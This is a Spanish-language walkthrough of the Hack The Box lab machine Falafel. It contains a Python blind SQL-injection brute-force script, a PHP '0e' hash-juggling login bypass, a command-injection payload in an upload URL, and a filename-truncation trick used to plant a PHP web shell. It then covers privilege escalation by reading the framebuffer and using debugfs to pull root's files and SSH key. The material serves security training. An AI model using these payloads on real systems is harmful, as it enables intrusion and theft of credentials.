---
layout: single
title: HTB-Falafel
excerpt: "WriteUp con metodología de la máquina Falafel."
date: 2021-12-15
classes: wide
header:
  icon: /assets/images/hackthebox.webp
  teaser_home_page: true
  teaser: /assets/images/WriteUps/Falafel.png
categories:
  - WriteUps
tags:
  - HTB

---


<center><img src='/assets/images/WriteUps/Falafel.png'></center>

IP -> 10.10.10.73

## Nmap
Utilizamos [nmap](/Nmap/) y obtenemos los siguientes resultados.

[Falafel Nmap Result](/assets/files/WriteUps/Falafel.txt)

## http
Vemos un panel de autenticación y un robots.txt que desactiva todo lo que acabe en .txt
Probamos credenciales típicas en el panel de autenticación. Al probar vemos que podemos validar usuarios válidos, **admin** es un usuario válido. Al probar inyecciones SQL, vemos que si utilizamos la clásica de 1=1, nos reporta que el usuario es "válido". 


# Exploitation
## SQLi
Probamos a buscar si nos reporta errores al ordenar los datos, haciendo pruebas vemos que nos reporta "Try again", si es falso, y "Wrong identification: Admin" cuando es satisfactoria.

> 4 columnas

Pero al intentar el "union select 1,2,3,4-- -" nos reporta "Hacked Attempt Detected!" sospechamos de posibles badwords. Haciendo pruebas comprobamos qué palabra nos da error.

> union es una badword

Aunque probamos diferentes formas como poniendo mayúsculas pero no funciona. Probamos inyección basada en tiempo pero tambien es badword

> sleep es badword

Podemos probar otras cosas como:

> admin' and substring(username,1,1)='a'-- -
> admin' and substring(username,2,1)='d'-- -

Vemos que es satisfactoria. Podemos fuzzear. Vamos a fuzzearo otro campo: "password" 

> admin' and substring(password,1,1)='a'-- -

Toca montarse un script para realizar la fuerzabruta

```python
#!/usr/bin/python3
#coding: utf-8

from pwn import *
import pdb
import string

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = 'http://10.10.10.73/login.php'
all_characters = string.ascii_lowercase + string.digits

def makeSQLi():
	
	# admin' and substring(password,1,1)='a'-- -
	
	password = ""
	
	p1 = log.progress("SQLI")
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("PAYLOAD")
	p3 = log.progress("PASSWORD")
	
	for position in range(1, 40):
		for character in all_characters:
			
			p1.status("Probando con el caracter %s en la posición [%s]" % (character, position))
			
			post_data = {
				'username': """admin' and substring(password,%s,1)='%s'-- -""" % (position, character),
				'password': 'admin'
			}
	
			p2.status(post_data['username'])
			
			r = requests.post(main_url, data=post_data)
		
			if "Try again.." not in r.text:
				password += character
				p3.status(password)
				break
		
if __name__ == '__main__':
	makeSQLi()

```

> Obtenemos un hash de admin

Probamos a crackearlo, pero no sabemos que tipo de hash es, llama la atención que empieza por "0e" y el resto son números.

## http
Fuzzeamos el servicio con [wfuzz](/wfuzz/) o [gobuster](/gobuster/). Fuzzeamos archivos con extensión php y txt.

> cyberlaw.txt

En el archivo vemos que hay otro usuario llamado "cris".
Vamos a tratar de extraer la contraseña con el script anterior.

> Obtenemos hash de cris

Este hash parece más md5. Probamos en **crackstation** con rainbow tables  y conseguimos la contraseña.

> USER: chris
> PASS: juggling

En la nota tambien vimos que el usuario chris consiguió entrar como admin en la página. Intentamos entrar el "upload.php". Pero nos aplica un redirect al "index.php". Con **burpsuite** tratamos de forzar el "200 OK" aunque no conseguimos nada.

Con el usuario "chris" no conseguimos hacer nada. Pero la contraseña puede ser una pista, para realizar un **Type Juggling**. Probamos pero nada.

Volviendo al hash del admin, vemos que puede ser un 0 elevado a un numero, podemos tratar de hacer una colision de hashes. Buscamos en google. "php 0e hash collition". Vemos varias cadenas de palabras que pueden funcionar, probamos a ver. Si el desarrollador usó \"=\=" en lugar de "\==\=", va a comparar "0=0". Funciona, hemos iniciado sesión como admin.

> USER: admin
> PASS: aabg7XSs

Ya podemos acceder al panel "upload.php". Nos pide una imagen para subir mediante url.

Probamos SSRF, cargando localhost, pero no funciona. Probamos una url de un tercero, como la nuestra. Y funciona. Trata con wget, descargar la url, nos muestra que se mueve a una ruta en upload/, probamos la ruta y existe. Probamos a subir una imgaen, y funciona.

Como está utilizando wget, podemos intentar a inyectar comandos utilizando ";".

> http\://10.10.14.13/test.png;ping -c 1 10.10.14.13

Pero nos pide que sea de tipo ".png". Vamos a probar a añadir ".png" al final.

> http\://10.10.14.13/test.png;ping -c 1 10.10.14.13;.png

Pero la vulnerabilidad está en que nos muestra como se guarda el archivo, en **Linux**, hay un total de 255 caracteres como máximo para un nombre de archivo. Si ponemos `"A"*241 + ".png"`

Al subir el archivo, wget, recorta el nombre de archivo, y quita la extensión. Podemos computar cual es el offset hasta donde recorta y ponerle otro tipo de extensión, bypaseando el que tenga que acabar en ".png".

> offset: 236

Creamos un archivo:
```python
print("A"*232 + ".php" + ".png")
```

Y dentro le ponemos una estructura para una web shell por php. Y por último subimos el archivo, al acceder al archivo, tenemos una webshell. Nos enviamos una reverse shell.


# User Pivoting (moshe)
## OS
```bash
uname -a
lsb_release -a
cd /var/www/html
grep -r -i -E "password|username"
```

> USER: moshe
> PASS: falafelisReallyTasty

> user.txt

# User Pivoting (yossi)
## OS
```bash
whoami
sudo -l
id
cd /
for group in $(groups); do echo -e "[+] Listando archivos con el groupo $group asignado:"; find \-group $group 2>/dev/null; done
```

> /dev/fb0

Como estamos en el grupo video, podemos ver el **frame buffer** de capturas de pantalla. 

```bash
cd /tmp
cat /dev/fb0 > Captura
```

Aunque tenemos la captura no sabemos cuales son las proporciones.

```bash
cd /
cat $(find \-name "virtual_size" 2>/dev/null)
```

> Captura
> Proporciones: 1176, 885

Nos traemos el archivo "Captura" a nuestro equipo. Lo abrimos con **GIMP**. Lo abrimos como "dato de imagen en bruto", le asignamos las proporciones correctas, probamos distintos tipos de imagen hasta que se vea bien. Tenemos la captura. Y en esta aparece una contraseña.

> USER: yossi
> PASS: MoshePlzStopHackingMe!

# PrivEsc
## OS
```bash
sudo -l
cd / 
find \-perm -4000 2>/dev/null
for group in $(groups); do echo -e "[+] Listando archivos con el groupo $group asignado:"; find \-group $group 2>/dev/null; done
```

> Tenemos control del /dev/sda

```bash
debugfs /dev/sda1
cd root
cat root.txt
```

> root.txt

Si queremos una consola, en el directorio /root/.ssh/, abrimos la id_rsa, la copiamos y nos conectamos por **ssh**.
